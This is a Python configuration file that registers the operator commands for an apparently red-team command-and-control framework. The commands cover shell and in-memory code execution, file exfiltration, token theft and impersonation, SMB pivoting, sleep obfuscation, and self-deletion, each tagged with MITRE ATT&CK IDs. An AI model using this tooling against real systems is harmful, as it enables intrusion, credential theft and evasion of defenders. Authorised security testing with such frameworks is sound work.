import conquest

# Create default modules (selectable during payload generation)
conquest.createModule("shell", "Execute shell commands.")
conquest.createModule("bof", "Load and execute BOF/COFF files in memory.")
conquest.createModule("dotnet", "Load and execute .NET assemblies in memory.")
conquest.createModule("dll", "Load and execute DLLs in memory.")
conquest.createModule("filetransfer", "Upload/download files to/from the target system.")
conquest.createModule("process", "Interact with Windows processes.")
conquest.createModule("filesystem", "Conduct simple filesystem operations via Windows API.")
conquest.createModule("screenshot", "Take and retrieve a screenshot of the target desktop.")
conquest.createModule("token", "Manipulate Windows access tokens.")

# Built-in modules (always enabled)
cmd_exit = (
    conquest.createCommand(name="exit", description="Exit the agent.", example="exit process", message="Tasked agent to exit.")
            .addArgString("type", """Available options: 
  - PROCESS (default)
  - THREAD.""", False, "PROCESS")
            .registerToGroup("core")
)

cmd_selfdestruct = (
    conquest.createCommand(name="self-destruct", description="Exit the agent and delete the executable from disk.", example="self-destruct", 
                           message="Tasked agent to self-destruct.", mitre=["T1070.004"])
            .registerToGroup("core")
)

cmd_sleep = (
    conquest.createCommand(name="sleep", description="Update sleep delay settings.", example="sleep 5", 
                           message="Tasked agent to update sleep delay.", mitre=["T1029"])
            .addArgInt("delay", "Delay in seconds.", True)
            .registerToGroup("core")
)

cmd_jitter = (
    conquest.createCommand(name="jitter", description="Update jitter settings.", example="jitter 15", 
                           message="Tasked agent to update jitter.", mitre=["T1029"])
            .addArgInt("jitter", "Jitter in % (0-100).", True)
            .registerToGroup("core")
)

cmd_sleepmask = (
    conquest.createCommand(name="sleepmask", description="Retrieve or update sleepmask settings. Executing without arguments retrieves the current sleepmask settings.", example="sleepmask --technique ekko --spoof", 
                           message="Tasked agent to update sleepmask settings.", mitre=["T1027"])
            .addFlagString("--technique", "technique", """Sleep obfuscation technique.
Available options:
  - NONE
  - EKKO
  - ZILEAN
  - FOLIAGE""")
            .addFlagBool("--spoof", "spoof", "Enable stack spoofing to obfuscate the call stack.")
            .registerToGroup("core")
)

cmd_link = (
    conquest.createCommand(name="link", description="Create a link to a SMB agent.", example="link DC01 msagent_1234", 
                           message="Tasked agent to link to SMB agent.", mitre=["T1021.002", "T1090.001"])
            .addArgString("host", "Host on which the SMB agent is running.", True)
            .addArgString("pipe", "Name of the named pipe (SMB listener).", True)
            .registerToGroup("core")
)

cmd_unlink = (
    conquest.createCommand(name="unlink", description="Remove a link to a SMB agent.", example="unlink C804A284", message="Tasked agent to unlink SMB agent.")
            .addArgString("agent", "ID of the agent to unlink.", True)
            .registerToGroup("core")
)

cmd_links = (
    conquest.createCommand(name="links", description="List linked agents.", example="links", message="Tasked agent to list linked agents.")
            .registerToGroup("core")
)

cmd_jobs = (
    conquest.createCommand(name="jobs", description="List running jobs.", example="jobs", message="Tasked agent to list jobs.")
            .registerToGroup("core")
)

cmd_cancel = ( 
    conquest.createCommand(name="cancel", description="Cancel a running job.", example="cancel DEADBEEF", message="Tasked agent cancel a job.")
            .addArgString("job", "ID of the job to cancel.", True)
            .registerToGroup("core")
)

# Execution modules
cmd_shell = (
    conquest.createCommand(name="shell", description="Execute a shell command and retrieve the output.", example="shell whoami /all", 
                           message="Tasked agent to execute shell command and retrieve the output.", mitre=["T1059.003"])
            .addArgString("command", "Command to be executed.", True)
            .addArgString("arguments", "Arguments to be passed to the command.", False, "", -1)
            .registerToGroup("execution")
            .registerToModule("shell")
)

cmd_bof = (
    conquest.createCommand(name="bof", description="Execute an object file in memory and retrieve the output.", example="bof /path/to/whoami.x64.o", 
                           message="Tasked agent to execute an object-file in memory and retrieve the output.", mitre=["T1055", "T1620"])
            .addArgFile("object-file", "Path to the object file to execute.", True)
            .addArgString("arguments", "Arguments to be passed to the object file, packed as a HEX string according to beacon_generate.py.")
            .registerToGroup("execution")
            .registerToModule("bof")
)

cmd_dotnet = (
    conquest.createCommand(name="dotnet", description="Execute a .NET assembly in memory and retrieve the output.", example="dotnet /path/to/SharpHound.exe -c all -d domain.local", 
                           message="Tasked agent to execute a .NET assembly in memory and retrieve the output.", mitre=["T1055", "T1620"])
            .addArgFile("assembly", "Path to the .NET assembly to execute.", True)
            .addArgString("arguments", "Arguments to be passed to the assembly. Arguments are handled as STRING.", False, "", -1)
            .registerToGroup("execution")
            .registerToModule("dotnet")
)

cmd_dll = (
    conquest.createCommand(name="dll", description="Execute a DLL asynchronously in memory.", example="dll /path/to/async-bof.dll Run <packed-args>", 
                           message="Tasked agent to execute a DLL in memory.", mitre=["T1620"])
            .addArgFile("dll", "Path to the DLL to execute.", True)
            .addArgString("function", "Name of the exported function to execute.", True)
            .addArgString("arguments", "Arguments to pass to the exported function, packed as a HEX string.", False)
            .registerToGroup("execution")
            .registerToModule("dll")
)

# Post-exploitation
cmd_download = (
    conquest.createCommand(name="download", description="Download a file.", example="download C:\\Users\\john\\Documents\\Database.kdbx", 
                           message="Tasked agent to download file.", mitre=["T1005", "T1041"])
            .addArgString("file", "Path to file to download from the target machine.", True)
            .registerToGroup("post-exploitation")
            .registerToModule("filetransfer")
)

cmd_upload = (
    conquest.createCommand(name="upload", description="Upload a file.", example="upload /path/to/payload.exe", 
                           message="Tasked agent to upload file.", mitre=["T1544"])
            .addArgFile("file", "Path to file to upload to the target machine.", True)
            .addArgString("destination", "Path to upload the file to. By default, uploads to current directory.")
            .registerToGroup("post-exploitation")
            .registerToModule("filetransfer")
)

# Situational awareness
cmd_ps = (
    conquest.createCommand(name="ps", description="Display running processes.", example="ps", 
                           message="Tasked agent to display running processes.", mitre=["T1424"])
            .registerToGroup("situational awareness")
            .registerToModule("process")
)

cmd_pwd = (
    conquest.createCommand(name="pwd", description="Retrieve current working directory.", example="pwd",
                           message="Tasked agent to retrieve current working directory.", mitre=["T1083"])
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_cd = (
    conquest.createCommand(name="cd", description="Change current working directory.", example="cd C:\\Windows\\Tasks", 
                           message="Tasked agent to change working directory.", mitre=["T1083"])
            .addArgString("directory", "Relative or absolute path of the directory to change to.", True)
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_ls = (
    conquest.createCommand(name="ls", description="List files and directories.", example="ls C:\\Users\\Administrator\\Desktop", 
                           message="Tasked agent to list files and directories.", mitre=["T1083"])
            .addArgString("directory", "Relative or absolute path. (default: current working directory)", False, ".")
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_rm = (
    conquest.createCommand(name="rm", description="Remove a file.", example="rm C:\\Windows\\Tasks\\payload.exe", message="Tasked agent to remove file.")
            .addArgString("file", "Relative or absolute path to the file to delete.", True)
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_rmdir = (
    conquest.createCommand(name="rmdir", description="Remove a directory.", example="rmdir C:\\Payloads", message="Tasked agent to remove directory.")
            .addArgString("directory", "Relative or absolute path to the directory to delete.", True)
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_move = (
    conquest.createCommand(name="move", description="Move a file or directory.", example="move source.exe C:\\Windows\\Tasks\\destination.exe", message="Tasked agent to move file or directory.")
            .addArgString("source", "Source file path.", True)
            .addArgString("destination", "Destination file path.", True)
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_copy = (
    conquest.createCommand(name="copy", description="Copy a file or directory.", example="copy source.exe C:\\Windows\\Tasks\\destination.exe", message="Tasked agent to copy file or directory.")
            .addArgString("source", "Source file path.", True)
            .addArgString("destination", "Destination file path.", True)
            .registerToGroup("situational awareness")
            .registerToModule("filesystem")
)

cmd_screenshot = (
    conquest.createCommand(name="screenshot", description="Take and retrieve a screenshot of the target desktop.", example="screenshot", 
                           message="Tasked agent to take a screenshot of the target desktop.", mitre=["T1113"])
            .registerToGroup("situational awareness")
            .registerToModule("screenshot")
)

# Token manipulation
cmd_maketoken = (
    conquest.createCommand(name="make-token", description="Create an access token from username and password.", example="make-token LAB\\john Password123!", 
                           message="Tasked agent to create an access token from username and password.", mitre=["T1134.003"])
            .addArgString("domain\\username", "Account domain and username. For impersonating local users, use .\\username.", True)
            .addArgString("password", "Account password.", True)
            .addFlagInt("--type", "logonType", """Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types).
  - 2: LOGON_INTERACTIVE
  - 3: LOGON_NETWORK
  - 4: LOGON_BATCH
  - 5: LOGON_SERVICE
  - 8: LOGON_NETWORK_CLEARTEXT 
  - 9: LOGON_NEW_CREDENTIALS (default)                        
""", False, 9)
            .addFlagBool("--store", "store", "Store access token in vault.")
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_stealtoken = (
    conquest.createCommand(name="steal-token", description="Steal the primary access token of a remote process.", example="steal-token 1234", 
                           message="Tasked agent to steal an access token.", mitre=["T1134.001"])
            .addArgInt("pid", "Process ID of the target process.", True)
            .addFlagBool("--store", "store", "Store access token in vault.")
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_usetoken = (
    conquest.createCommand(name="use-token", description="Use and impersonate access token from the vault.", example="use-token 1",
                           message="Tasked agent to use a token from the vault.", mitre=["T1134"])
            .addArgInt("token", "ID of the token to impersonate.", True)
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_removetoken = (
    conquest.createCommand(name="remove-token", description="Remove access token from the vault.", example="remove-token --all",
                           message="Tasked agent to use a token from the vault.", mitre=["T1134"])
            .addArgInt("token", "ID of the token to remove.")
            .addFlagBool("--all", "all", "Remove all tokens from the vault.")
            .setHandler(lambda agentId, cmdline, args: (
                token := conquest.get_int(args, 0),
                remove_all := conquest.get_bool(args, 1),
                conquest.error(agentId, "Specify either a token ID or --all.", cmdline) if not remove_all and token == 0
                else conquest.execute_command(agentId, cmdline)
            ))
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_rev2self = (
    conquest.createCommand(name="rev2self", description="Revert to original access token.", example="rev2self", 
                           message="Tasked agent to revert to original access token.", mitre=[])
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_tokenvault = ( 
    conquest.createCommand(name="token-vault", description="List access tokens stored in the vault.", example="token-vault",
                           message="Tasked agent to list token vault.", mitre=[])
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_tokeninfo = (
    conquest.createCommand(name="token-info", description="Retrieve information about the current access token.", example="token-info", 
                           message="Tasked agent to retrieve information about the current access token.")
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_enablepriv = (
    conquest.createCommand(name="enable-privilege", description="Enable a token privilege.", example="enable-privilege SeImpersonatePrivilege", 
                           message="Tasked agent to enable a token privilege.", mitre=["T1134"])
            .addArgString("privilege", "Privilege to enable.", True)
            .registerToGroup("user impersonation")
            .registerToModule("token")
)

cmd_disablepriv = (
    conquest.createCommand(name="disable-privilege", description="Disable a token privilege.", example="disable-privilege SeImpersonatePrivilege", 
                           message="Tasked agent to disable a token privilege.", mitre=["T1134"])
            .addArgString("privilege", "Privilege to disable.", True)
            .registerToGroup("user impersonation")
            .registerToModule("token")
)